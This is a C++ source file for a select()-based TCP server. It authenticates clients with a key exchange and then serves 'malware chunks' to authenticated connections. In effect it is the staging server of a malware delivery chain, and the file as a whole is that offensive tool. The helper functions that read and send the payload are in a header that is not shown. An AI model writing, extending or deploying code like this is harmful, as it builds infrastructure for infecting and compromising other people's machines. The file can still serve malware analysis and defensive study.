#include "network.hpp"

int main() {
    fd_set master, read_fds;  
    int newClientFD, maxFD, nBytes;        
    struct sockaddr_storage clientAddress; 
    socklen_t addrlen;
    char buf[256];
    std::unordered_map<const char*, const char*> authConnections;

    FD_ZERO(&master);    
    FD_ZERO(&read_fds);

    int serverSock = init_server();
    maxFD = serverSock;
    FD_SET(serverSock, &master);
     
    /* Main Server Loop */
    while(true) {
        read_fds = master; // Init readSet every itteration since SELECT is destructive
        if (select(maxFD+1, &read_fds, NULL, NULL, NULL) == -1) {
            std::cerr << "select error " <<  std::strerror(errno) << std::endl;
            exit(4);
        }

        /* Check existing connections for read data */
        for(int respondingSock = 0; respondingSock <= maxFD; respondingSock++) {
            if (FD_ISSET(respondingSock, &read_fds)) { 

                /* Check & Handle new connection */
                if (respondingSock == serverSock) {
                    addrlen = sizeof(clientAddress);
                    newClientFD = accept(serverSock,(struct sockaddr *)&clientAddress,&addrlen);
                    if (newClientFD == -1) {
                        std::cout << "accept() error " << std::strerror(errno) << std::endl;
                    }
                    else { 
                        // valid new sokcet -> Update in sets & Update maxFD
                        FD_SET(newClientFD, &master); 
                        if (newClientFD > maxFD) {  
                            maxFD = newClientFD; 
                        }
                        std::cout << "[+] new connection from " << get_peer_ip(newClientFD) << " on socket " << newClientFD << std::endl;
                    }
                } 
                

                /* Check & Handle data from a client */
                else {
                    
                    memset(buf, 0, sizeof(buf));
                    if ((nBytes = recv(respondingSock, buf, sizeof buf, 0)) <= 0) {
                        if (nBytes == 0) {
                            std::cout << "[!] socket " << respondingSock << " closed connection" << std::endl;
                        } 
                        else {
                            std::cerr << "[!] recv error " << std::strerror(errno) << std::endl;
                        }
                        close(respondingSock); 
                        FD_CLR(respondingSock, &master);
                    } 
                    

                    // connection authentication routine
                    else { 
                        char *clientIP = get_peer_ip(respondingSock);
                        if ( nBytes == 23 ){ 
                            char clientKey[10] = {0}; 
                            int status = handle_new_connection(respondingSock, buf , clientKey);
                            if (status == 0 ){ 
                                // Update/Override the authenticated connections
                                authConnections.insert(std::make_pair(clientIP, clientKey));
                                std::cout << "[+] Created entry in authenticated connection list for -> (" << clientIP << ") with key";
                                std::cout.write(clientKey, 10) << std::endl;
                                send(respondingSock, "1" , 2 , 0);
                            }
                            else {
                                std::cout << "[!] Closing connection caused by authentication error on sock: " << respondingSock << std::endl;
                                send(respondingSock, "0" , 2, 0); 
                                close(respondingSock);
                                FD_CLR(respondingSock, &master);
                            }

                        }

                        // on-going connection -> return malware chunk
                        else if (nBytes == 11 ) {
                            bool validConnection = false;
                            for (auto &connection : authConnections){ // check for an authenticated connection
                                if (strcmp(clientIP ,connection.first ) == 0 && memcmp(buf, connection.second, 10) == 0 ){
                                    validConnection = true;
                                    if (handle_connection(respondingSock, buf) == -1 ) {
                                        std::cout << "[!] Client will need to resend request." << std::endl; 
                                    }
                                    else {
                                        std::cout << "[+] Successfully sent malware chunk " << clientIP << std::endl;
                                    }
                                    break;
                                }
                            }
                            if (validConnection == false) {
                                std::cout << "Attempted Unauthorized request, closing connectin with " << clientIP << std::endl;    
                                send(respondingSock, "Unauthorized request, closing connection.", 42, 0);
                                close(respondingSock);
                                FD_CLR(respondingSock, &master);
                            }   
                        }
                        else {
                            std::cout << "[!] Recived undefined data, Closing connection on socket " << respondingSock << buf << std::endl;
                            close(respondingSock);
                            FD_CLR(respondingSock , &master);
                        }
                    }
                } 
            } 
        } 
    } 
    
    return 0;
}
